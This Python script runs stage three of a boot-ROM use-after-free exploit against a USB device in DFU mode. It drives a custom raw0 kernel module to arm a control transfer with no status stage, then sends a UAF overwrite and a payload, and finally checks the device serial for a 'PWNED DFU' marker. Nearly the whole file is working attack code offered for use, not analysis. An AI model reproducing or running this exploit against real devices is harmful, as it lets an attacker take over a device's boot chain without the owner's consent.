#!/usr/bin/env python3
"""stage3-final.py — execute stage 3 on the post-bridge knife-edge device.

Preconditions (measured live):
  - DFU device re-enumerated right after the stage-2 bridge port reset
  - ROM heap holds the knife-edge spray state (heap persists the reset)
  - the module raw0 hook re-captured the fresh Address Device

Runs: armed crit-IN (module, no status) -> UAF overhang write -> payload
-> final reset -> PWN marker verify. NO extra control traffic first.
"""
import sys
import time

import importlib.util
import os

_spec = importlib.util.spec_from_file_location(
    'exfin',
    os.path.join(os.path.dirname(os.path.abspath(__file__)),
                 'exploit-final.py'))
F = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(F)


def main():
    P = F.P
    R = F.R
    usb = P.LibUSB()
    P.LibUSB._current = usb
    payload, overwrite = P.load_payloads('classic')
    print('[stage3] payload=%d overwrite=%d' % (len(payload), len(overwrite)))

    # module capture check - NO usbfs traffic yet; re-arm the hook if stale
    import os
    fd_raw = os.open('/dev/raw0', os.O_RDWR)

    def mod_state():
        st = R.raw0_state(fd_raw)
        print('[module] xhci=0x%x slot=%d state=%d pushed=%d k_deq=%d ep0=0x%x'
              % (st['xhci'], st['slot'], st['state'], st['pushed'],
                 st['k_deq'], st['ep0']))
        return st

    st = mod_state()
    tries = 0
    while not st['state'] and tries < 3:
        tries += 1
        print('[stage3] capture flag down (state=%d) - port reset #%d'
              % (st['state'], tries))
        dev0, h0, d0, s0 = P.acquire(usb, want_serial=False)
        if dev0:
            usb.reset(h0)
            usb.lib.libusb_release_interface(h0, 0)
            usb.lib.libusb_close(h0)
        time.sleep(1.5)
        st = mod_state()
    if not st['state']:
        print('[module] NOT CAPTURED after resets - need module reload + '
              'fresh dance; aborting before writes')
        return 1
    # NOTE: the ep0 state print is an offset-suspect field; the push's own
    # return code is the verdict on ring health.

    # open the device (libusb open = no control traffic)
    dev, handle, desc, serial = P.acquire(usb, want_serial=False)
    if not dev:
        print('[fatal] device not openable')
        return 1
    print('[stage3] device open:', usb.describe(dev))

    # ---- B1: armed critical-IN via the CYC halt-recovery leak cycle ----
    # raw0_cyc: push SETUP+one 0x40 data TRB with NO status -> the xHC runs
    # SETUP + one IN packet, then halts at the missing status; the device's
    # io_request stays armed (no status token ever hits the wire), and the
    # module recovers the ring with Set TR Dequeue Pointer. This is the
    # sketch's "stops issuing IN tokens after exactly one packet" shape.
    import fcntl as _f0
    import struct as _s0
    IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
    crit_setup = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
    cyc_buf = (b'\x00' * 0x40)

    def cyc(setup, data, settle_us=1000):
        import ctypes as _ct
        arr = (_ct.c_ubyte * max(len(data), 1)).from_buffer_copy(
            bytes(data) if data else b'\x00')
        txn = _s0.pack('<8sIBBHIIQ',
                       setup, len(data), 1, 1, 0, settle_us, 0,
                       _ct.addressof(arr))
        try:
            _f0.ioctl(fd_raw, IOC_CYC, txn, True)
            _ = arr  # keep alive across the ioctl
            return 0
        except OSError as e:
            _ = arr
            return -e.errno

    rc = cyc(crit_setup, cyc_buf)
    print('[stage3] armed crit-IN CYC: rc=%d (0=recovered, 1=ran-clean, '
          '<0=error)' % rc)
    if rc < 0:
        time.sleep(0.5)
        rc = cyc(crit_setup, cyc_buf)
        print('[stage3] armed crit-IN CYC retry: rc=%d' % rc)
    if rc < 0:
        print('[stage3] CYC failed - see ring dump below')
        # ring forensics on failure
        try:
            import importlib.util as _ilu
            _sp = _ilu.spec_from_file_location(
                'pf', os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   'push-forensics.py'))
            PF = _ilu.module_from_spec(_sp)
            _sp.loader.exec_module(PF)
            buf = bytearray(PF.RD_SIZE)
            import fcntl as _f
            _f.ioctl(fd_raw, PF.IOC_RINGDUMP, buf, True)
            vals = _s0.unpack("<%dI" % (PF.RD_SIZE // 4), bytes(buf))
            head = dict(enq=vals[0], cyc=vals[1], hwdeq=vals[2],
                        epst=vals[3], slot=vals[4])
            print('[ring] enq=%d cyc=%d hwdeq=0x%x epst=0x%x slot=%d'
                  % (head['enq'], head['cyc'], head['hwdeq'], head['epst'],
                     head['slot']))
            PF.pr_rows(vals, head, 0, 8)
        except Exception as e:
            print('[ring] dump failed: %r' % (e,))
        return 1

    usb.claim(handle)

    # ---- B2: THE UAF WRITE (overhang wLength=0x40, 128 bytes) ---------
    data = b'\xCC' * 0x40 + overwrite
    rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0x0000, 0x0000, 0x40,
                            data=data, abandon=True, cancel_at=0x80,
                            timeout_ms=3000, name='uaf-write')
    print('[stage3] UAF write: rc=%s info=%r' % (rc, info))

    # ---- B3: THE PAYLOAD (wLength=0x2C0, 768 bytes) -------------------
    data = b'\xCC' * 0x40 + payload
    rc, info = usb.raw_ctrl(handle, 0x21, 0x01, 0x0000, 0x0000, 0x2C0,
                            data=data, abandon=True, cancel_at=0x300,
                            timeout_ms=4000, name='payload')
    print('[stage3] payload: rc=%s info=%r' % (rc, info))

    # ---- verdict -------------------------------------------------------
    P.reset_and_release(usb, handle, settle=2.0)
    serial = P.verify(usb)
    print('[verify] serial: %r' % serial)
    if P.PWN_MARKER in serial:
        print('*** PWNED DFU ***')
        return 0
    print('[verify] not pwned; fresh DFU + full run again')
    return 1


if __name__ == '__main__':
    sys.exit(main())
